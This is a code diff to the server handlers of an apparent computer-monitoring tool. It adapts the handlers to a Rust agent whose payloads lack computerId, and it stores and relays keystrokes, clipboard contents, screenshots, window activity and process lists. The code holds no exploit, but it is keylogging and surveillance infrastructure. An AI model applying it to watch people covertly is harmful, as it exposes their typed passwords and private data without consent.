@@ -258,43 +258,83 @@ function setupAgentNamespace(agentNs: Namespace, consoleNs: Namespace) {
       emitToWatching(computerId, "screen_frame", { ...data, computerId });
     });
 
-    // Activity handler
+    // Activity handler - supports both single entry and batched logs from Rust agent
     socket.on("activity", async (data: {
-      computerId: string;
-      type: string;
-      applicationName: string;
-      windowTitle: string;
-      duration: number;
+      computerId?: string;
+      type?: string;
+      applicationName?: string;
+      windowTitle?: string;
+      duration?: number;
       category?: string;
+      // Batched format from Rust agent
+      logs?: Array<{
+        applicationName: string;
+        windowTitle: string;
+        startTime: number;
+        endTime: number;
+        duration: number;
+        category?: string;
+      }>;
     }) => {
+      const computerId = socket.data?.computerId || data.computerId;
+      if (!computerId) {
+        console.error("Activity event missing computerId");
+        return;
+      }
+
       try {
-        await prisma.activityLog.create({
-          data: {
-            computerId: data.computerId,
-            type: data.type,
-            applicationName: data.applicationName,
-            windowTitle: data.windowTitle,
-            duration: data.duration,
-            category: data.category,
-            startTime: new Date(),
-          },
-        });
-        emitToWatching(data.computerId, "activity", data);
+        // Handle batched logs from Rust agent
+        if (data.logs && Array.isArray(data.logs)) {
+          for (const log of data.logs) {
+            await prisma.activityLog.create({
+              data: {
+                computerId,
+                type: "APPLICATION",
+                applicationName: log.applicationName,
+                windowTitle: log.windowTitle,
+                duration: log.duration,
+                category: log.category,
+                startTime: new Date(log.startTime),
+              },
+            });
+            emitToWatching(computerId, "activity", { computerId, ...log });
+          }
+        } else if (data.applicationName) {
+          // Handle single entry format
+          await prisma.activityLog.create({
+            data: {
+              computerId,
+              type: data.type || "APPLICATION",
+              applicationName: data.applicationName,
+              windowTitle: data.windowTitle || "",
+              duration: data.duration || 0,
+              category: data.category,
+              startTime: new Date(),
+            },
+          });
+          emitToWatching(computerId, "activity", { computerId, ...data });
+        }
       } catch (error) {
         console.error("Error saving activity:", error);
       }
     });
 
-    // Keystrokes handler
+    // Keystrokes handler - Rust agent doesn't send computerId in payload
     socket.on("keystrokes", async (data: {
-      computerId: string;
+      computerId?: string;
       strokes: Array<{ keys: string; applicationName: string; windowTitle: string; timestamp: number }>;
     }) => {
+      const computerId = socket.data?.computerId || data.computerId;
+      if (!computerId) {
+        console.error("Keystrokes event missing computerId");
+        return;
+      }
+
       try {
         for (const stroke of data.strokes) {
           await prisma.keylog.create({
             data: {
-              computerId: data.computerId,
+              computerId,
               keystrokes: stroke.keys,
               application: stroke.applicationName,
               windowTitle: stroke.windowTitle,
@@ -302,54 +342,100 @@ function setupAgentNamespace(agentNs: Namespace, consoleNs: Namespace) {
             },
           });
         }
-        emitToWatching(data.computerId, "keystrokes", data);
+        emitToWatching(computerId, "keystrokes", { computerId, ...data });
       } catch (error) {
         console.error("Error saving keystrokes:", error);
       }
     });
 
-    // Screenshot handler
-    socket.on("screenshot", async (data: { computerId: string; imageData: string; activeWindow?: string }) => {
+    // Screenshot handler - Rust agent sends "imageData" field
+    socket.on("screenshot", async (data: { computerId?: string; imageData: string; activeWindow?: string }) => {
+      const computerId = socket.data?.computerId || data.computerId;
+      if (!computerId) {
+        console.error("Screenshot event missing computerId");
+        return;
+      }
+
       try {
         const screenshot = await prisma.screenshot.create({
           data: {
-            computerId: data.computerId,
+            computerId,
             imageUrl: data.imageData,
             activeWindow: data.activeWindow,
           },
         });
-        emitToWatching(data.computerId, "screenshot", { ...data, id: screenshot.id });
+        emitToWatching(computerId, "screenshot", { computerId, ...data, id: screenshot.id });
       } catch (error) {
         console.error("Error saving screenshot:", error);
       }
     });
 
-    // Clipboard handler
-    socket.on("clipboard", async (data: { computerId: string; content: string; contentType: string }) => {
+    // Clipboard handler - Rust agent doesn't send computerId in payload
+    socket.on("clipboard", async (data: { computerId?: string; content: string; contentType: string; timestamp?: number }) => {
+      const computerId = socket.data?.computerId || data.computerId;
+      if (!computerId) {
+        console.error("Clipboard event missing computerId");
+        return;
+      }
+
       try {
         await prisma.clipboardLog.create({
           data: {
-            computerId: data.computerId,
+            computerId,
             content: data.content,
             contentType: data.contentType || "TEXT",
           },
         });
-        emitToWatching(data.computerId, "clipboard", data);
+        emitToWatching(computerId, "clipboard", { computerId, ...data });
       } catch (error) {
         console.error("Error saving clipboard:", error);
       }
     });
 
-    // Processes handler
-    socket.on("processes", (data: { computerId: string; processes: Array<{ name: string; pid: number; cpu: number; memory: number }> }) => {
-      emitToWatching(data.computerId, "processes", data);
+    // Processes handler - supports both old format and Rust agent format
+    socket.on("processes", (data: {
+      computerId?: string;
+      processes: Array<{
+        name?: string;
+        pid?: number;
+        cpu?: number;
+        memory?: number;
+        // Rust agent format
+        processName?: string;
+        processId?: number;
+        cpuUsage?: number;
+        memoryUsage?: number;
+        path?: string;
+        username?: string;
+      }>;
+    }) => {
+      const computerId = socket.data?.computerId || data.computerId;
+      if (!computerId) return;
+
+      // Normalize process data for consistent frontend format
+      const normalizedProcesses = data.processes.map(p => ({
+        name: p.name || p.processName || "Unknown",
+        pid: p.pid || p.processId || 0,
+        cpu: p.cpu ?? p.cpuUsage ?? 0,
+        memory: p.memory ?? p.memoryUsage ?? 0,
+        path: p.path,
+        username: p.username,
+      }));
+
+      emitToWatching(computerId, "processes", { computerId, processes: normalizedProcesses });
     });
 
-    // System info handler
-    socket.on("system_info", async (data: { computerId: string; cpuUsage: number; memoryUsage: number; diskUsage: number }) => {
+    // System info handler - Rust agent doesn't send computerId in payload
+    socket.on("system_info", async (data: { computerId?: string; cpuUsage: number; memoryUsage: number; diskUsage: number }) => {
+      const computerId = socket.data?.computerId || data.computerId;
+      if (!computerId) {
+        console.error("System info event missing computerId");
+        return;
+      }
+
       try {
         await prisma.computer.update({
-          where: { id: data.computerId },
+          where: { id: computerId },
           data: {
             cpuUsage: data.cpuUsage,
             memoryUsage: data.memoryUsage,
@@ -357,7 +443,7 @@ function setupAgentNamespace(agentNs: Namespace, consoleNs: Namespace) {
             lastSeen: new Date(),
           },
         });
-        emitToWatching(data.computerId, "system_info", data);
+        emitToWatching(computerId, "system_info", { computerId, ...data });
       } catch (error) {
         console.error("Error updating system info:", error);
       }
